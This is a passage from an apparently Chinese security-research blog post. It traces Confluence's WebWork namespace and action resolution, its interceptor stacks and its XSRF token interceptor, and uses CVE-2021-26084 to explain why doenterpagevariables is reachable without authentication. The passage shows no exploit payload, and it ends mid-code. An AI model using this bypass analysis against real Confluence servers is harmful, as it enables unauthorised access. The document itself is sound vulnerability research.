href="#2-1-Namespace-String" class="headerlink" title="2.1 Namespace String"></a>2.1 Namespace String</h3><blockquote><p>Namespace 的逻辑为uri path 中到最后一个反斜杠的子串</p></blockquote><p>在ServletDispatcher中，决定了Namespace 和ActionName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.serviceAction(request, response, <span class="built_in">this</span>.getNameSpace(request), <span class="built_in">this</span>.getActionName(request), <span class="built_in">this</span>.getRequestMap(request), <span class="built_in">this</span>.getParameterMap(request), <span class="built_in">this</span>.getSessionMap(request), <span class="built_in">this</span>.getApplicationMap());</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-816.png" alt="upload successful"></p><p>具体逻辑如下<br>ServletDispatcher</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getNameSpace</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> request.getServletPath();</span><br><span class="line">    <span class="keyword">return</span> getNamespaceFromServletPath(servletPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getNamespaceFromServletPath</span><span class="params">(String servletPath)</span> &#123;</span><br><span class="line">    servletPath = servletPath.substring(<span class="number">0</span>, servletPath.lastIndexOf(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> servletPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-Action-String"><a href="#2-2-Action-String" class="headerlink" title="2.2 Action String"></a>2.2 Action String</h3><blockquote><p>action string 对应的是最后一个/到最后一个. 之间的子串</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">getActionName</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> (String)request.getAttribute(<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (servletPath == <span class="literal">null</span>) &#123;</span><br><span class="line">        servletPath = request.getServletPath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getActionName(servletPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected String getActionName(String name) &#123;</span><br><span class="line">    int beginIdx = name.lastIndexOf(&quot;/&quot;);</span><br><span class="line">    int endIdx = name.lastIndexOf(&quot;.&quot;);</span><br><span class="line">    return name.substring(beginIdx == -1 ? 0 : beginIdx + 1, endIdx == -1 ? name.length() : endIdx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-Namespace-amp-Action"><a href="#2-3-Namespace-amp-Action" class="headerlink" title="2.3 Namespace &amp; Action"></a>2.3 Namespace &amp; Action</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getActionConfig:137, PluginAwareConfiguration$RuntimeConfigurationImpl (com.atlassian.confluence.setup.webwork)</span><br><span class="line">&lt;init&gt;:57, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">createActionProxy:43, DefaultActionProxyFactory (com.opensymphony.xwork)</span><br><span class="line">serviceAction:53, ConfluenceServletDispatcher (com.atlassian.confluence.servlet)</span><br><span class="line">service:199, ServletDispatcher (com.opensymphony.webwork.dispatcher)</span><br><span class="line">service:733, HttpServlet (javax.servlet.http)</span><br></pre></td></tr></table></figure><p>漏洞逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> ActionConfig <span class="title function_">getActionConfig</span><span class="params">(String namespace, String name)</span> &#123;</span><br><span class="line">    <span class="type">ActionConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 首先从namespace string 获取其下面所有的actions</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">actions</span> <span class="operator">=</span> (Map)<span class="built_in">this</span>.namespaceActionConfigs.get(namespace == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : namespace);</span><br><span class="line">    <span class="keyword">if</span> (actions != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 再从对应的actions里面获取</span></span><br><span class="line">        config = (ActionConfig)actions.get(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则从&quot;&quot;对应的namespace里获取</span></span><br><span class="line">    <span class="keyword">if</span> (config == <span class="literal">null</span> &amp;&amp; namespace != <span class="literal">null</span> &amp;&amp; !namespace.trim().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        actions = (Map)<span class="built_in">this</span>.namespaceActionConfigs.get(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (actions != <span class="literal">null</span>) &#123;</span><br><span class="line">            config = (ActionConfig)actions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-817.png" alt="upload successful"><br>这里可能有两个问题</p><ol><li>如果namespace实际不存在，也会从””里面获取，这里有46个action，可能会存在问题</li><li>namespace 存在extends继承，但是不会继承其interceptors，到值权限问题。</li></ol><p>比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;setup&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/setup&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingSetupStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;dosetuplicense&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.setup.actions.SetupLicenseAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/setup/setuplicense.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/setup/setuplicense.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;quick-setup&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>setupembeddeddb-default.action?atl_token=$&#123;xsrfToken&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;custom-setup&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>setupdbchoice-start.action<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;cluster-setup&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>setupcluster-start.action<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;setup&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/admin&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在xwork.xml的定义中</p><ol><li>admin namespace extends setup namespace</li><li>setup default interceptor validatingSetupStack，对应33个interceptor</li><li>admin default interceptor validatingStack，对应32个interceptor</li></ol><p>其中dosetuplicense action 没有自定义interceptor，所以继承的namespace的default interceptor，导致处理的interceptor 不同。</p><ol><li>在setup namespace 中<br><img src="/images/pasted-819.png" alt="upload successful"></li><li>在admin namespace 中<br><img src="/images/pasted-818.png" alt="upload successful"></li></ol><h2 id="0x03-Confluence的认证机制"><a href="#0x03-Confluence的认证机制" class="headerlink" title="0x03 Confluence的认证机制"></a>0x03 Confluence的认证机制</h2><p><img src="/images/pasted-815.png" alt="upload successful"></p><p>在之前的一篇分析文章中，参考【2】，有提到Confulence的账号权限逻辑。现在看当时的分析还是太浅尝辄止了，这里再过一遍。</p><h3 id="3-1-CVE-2021-26084-管中窥豹"><a href="#3-1-CVE-2021-26084-管中窥豹" class="headerlink" title="3.1 CVE-2021-26084 管中窥豹"></a>3.1 CVE-2021-26084 管中窥豹</h3><p>还是以CVE-2021-26084 的doenterpagevariables.action 为授权为例进行跟踪。</p><h4 id="3-1-1-doenterpagevariables"><a href="#3-1-1-doenterpagevariables" class="headerlink" title="3.1.1 doenterpagevariables"></a>3.1.1 doenterpagevariables</h4><p>doenterpagevariables 继承的pages namespace 的default interceptor： validatingStack</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;pages&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/pages&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;doenterpagevariables&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageVariablesAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doEnter&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>createpage 用到自定义的defaultStack interceptor</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;createpage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.CreatePageEntryAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDefault&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;already-exists&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>$&#123;@com.atlassian.confluence.util.GeneralUtil@getPageUrl(page)&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;locked&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirectwithflash&quot;</span>&gt;</span>/users/viewmydrafts.action?editingLocked<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;user-limit-reached&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/users/viewmydrafts.action?userLimitReached<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;activity-unavailable&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/users/viewmydrafts.action?editingFailed<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实际上validatingStack包含了defaultStack，为什么反而能为授权访问呢？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;captcha&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validator&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;workflow&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;profiling&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;location&quot;</span>&gt;</span>After validatingStack<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-1-2-ConfluenceXsrfTokenInterceptor"><a href="#3-1-2-ConfluenceXsrfTokenInterceptor" class="headerlink" title="3.1.2 ConfluenceXsrfTokenInterceptor"></a>3.1.2 ConfluenceXsrfTokenInterceptor</h4><p>实际上interceptor的不同只是授权的一个原因，还有原因是里面的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isInspectionDisabledForRequest(actionInvocation) ? actionInvocation.invoke() : <span class="built_in">super</span>.intercept(actionInvocation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此处result=input</p><blockquote><p>说明下前文struts2 架构图中的interceptors 为什么只有3个。这是因为一般的interceptors invocation接口，默认最后都要return invocation.invoke()，以此交由下一个interceptor处理。当然如果当前interceptor 也可以直接返回其他的code，结束interceptors。<br>具体可以看DefaultAcationInvocation#invoke的逻辑，当某一个interceptor有返回resultCode，而不是invocation.invoke()，会进入executeResult，将executed 置为true，退出当前循环。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.executed) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Action has already executed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.interceptors.hasNext()) &#123;</span><br><span class="line">            <span class="type">Interceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> (Interceptor)<span class="built_in">this</span>.interceptors.next();</span><br><span class="line">            <span class="built_in">this</span>.resultCode = interceptor.intercept(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.proxy.getConfig().getMethodName() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.resultCode = <span class="built_in">this</span>.getAction().execute();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.resultCode = <span class="built_in">this</span>.invokeAction(<span class="built_in">this</span>.getAction(), <span class="built_in">this</span>.proxy.getConfig());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.executed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.preResultListeners != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> <span class="built_in">this</span>.preResultListeners.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">                    <span class="type">PreResultListener</span> <span class="variable">listener</span> <span class="operator">=</span> (PreResultListener)iterator.next();</span><br><span class="line">                    listener.beforeResult(<span class="built_in">this</span>, <span class="built_in">this</span>.resultCode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.proxy.getExecuteResult()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.executeResult();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.executed = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>而在ConfluenceXsrfTokenInterceptor 中，extends 的 XsrfTokenInterceptor，其实现如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Method</span> <span class="variable">invocationMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.versionSupport.extractMethod(invocation);</span><br><span class="line">       <span class="type">String</span> <span class="variable">configParam</span> <span class="operator">=</span> (String)invocation.getProxy().getConfig().getParams().get(<span class="string">&quot;RequireSecurityToken&quot;</span>);</span><br><span class="line">       <span class="type">RequireSecurityToken</span> <span class="variable">legacyAnnotation</span> <span class="operator">=</span> (RequireSecurityToken)invocationMethod.getAnnotation(RequireSecurityToken.class);</span><br><span class="line">       <span class="type">XsrfProtectionExcluded</span> <span class="variable">annotation</span> <span class="operator">=</span> (XsrfProtectionExcluded)invocationMethod.getAnnotation(XsrfProtectionExcluded.class);</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">isProtected</span> <span class="operator">=</span> <span class="built_in">this</span>.methodRequiresProtection(configParam, annotation, legacyAnnotation);</span><br><span class="line">       <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> ServletActionContext.getRequest().getParameter(<span class="string">&quot;atl_token&quot;</span>);</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">validToken</span> <span class="operator">=</span> <span class="built_in">this</span>.tokenGenerator.validateToken(ServletActionContext.getRequest(), token);</span><br><span class="line">       <span class="keyword">if</span> (isProtected &amp;&amp; !validToken) &#123;</span><br><span class="line">           <span class="keyword">if</span> (token == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="built_in">this</span>.addInvalidTokenError(<span class="built_in">this</span>.versionSupport.extractAction(invocation), <span class="string">&quot;atlassian.xwork.xsrf.notoken&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="built_in">this</span>.addInvalidTokenError(<span class="built_in">this</span>.versionSupport.extractAction(invocation), <span class="string">&quot;atlassian.xwork.xsrf.badtoken&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">// 注意此处，直接return了有效的resultCode，不在进入下面的invocation.invoke() 逻辑</span></span><br><span class="line"></span><br><span class="line">           ServletActionContext.getResponse().setStatus(<span class="number">403</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;input&quot;</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而在doenterpagevariables 对应的action中，input对应的是渲染vm模板？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;doenterpagevariables&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.pages.actions.PageVariablesAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doEnter&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage-entervariables.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;velocity&quot;</span>&gt;</span>/pages/createpage.vm<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>疑问：为什么error 和input也是渲染模板，success也是</p></blockquote><p><img src="/images/pasted-820.png" alt="upload successful"></p><blockquote><p>疑问，这里问什么这了多resultconfig，xml中只配置了3个。</p></blockquote><blockquote><p>提示：有些interceptor会返回input的result，也会触发对应的result处理，不一定全在action 逻辑中。</p></blockquote><h4 id="3-1-3-createpage"><a href="#3-1-3-createpage" class="headerlink" title="3.1.3 createpage"></a>3.1.3 createpage</h4><p>同样的，先看result映射<br><img src="/images/pasted-821.png" alt="upload successful"></p><h3 id="3-2-认证相关-Interceptors"><a href="#3-2-认证相关-Interceptors" class="headerlink" title="3.2 认证相关 Interceptors"></a>3.2 认证相关 Interceptors</h3><ul><li>ConfluenceAccessInterceptor</li><li>PageAwareInterceptor</li><li>PermissionCheckInterceptor</li><li>UserAwareInterceptor</li></ul><h4 id="3-2-1-ConfluenceAccessInterceptor"><a href="#3-2-1-ConfluenceAccessInterceptor" class="headerlink" title="3.2.1 ConfluenceAccessInterceptor"></a>3.2.1 ConfluenceAccessInterceptor</h4><p>总结：</p><blockquote><p>ConfluenceAccessInterceptor 是用来实现以下四个注解的，</p><ol><li>PublicAccess: 所有都可访问</li><li>RequiresAnyConfluenceAccess: 对应LICENSED_ACCESS/UNLICENSED_AUTHENTICATED_ACCESS/ANONYMOUS_ACCESS</li><li>RequiresLicensedConfluenceAccess：对应LICENSED_ACCESS</li><li>RequiresLicensedOrAnonymousConfluenceAccess<br>逻辑1: 如果目标 package / class / method 没有以上的注解，那么返回ABSTIN，也可以认证通过<br>逻辑2: 如果目标 package / class / method 有以上注解，那么和当前用户对应的权限进行匹配，返回 GRANTED / DENIED。</li></ol></blockquote><p>具体逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> ContainerManager.isContainerSetup() &amp;&amp; !<span class="built_in">this</span>.isAccessPermitted(actionInvocation) ? <span class="string">&quot;notpermitted&quot;</span> : actionInvocation.invoke();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAccessPermitted</span><span class="params">(ActionInvocation actionInvocation)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ((ActionAccessChecker)<span class="built_in">this</span>.actionAccessChecker.get()).isAccessPermitted(actionInvocation.getAction(), actionInvocation.getProxy().getConfig().getMethodName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Access 判断逻辑<br>ActionAccessChecker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 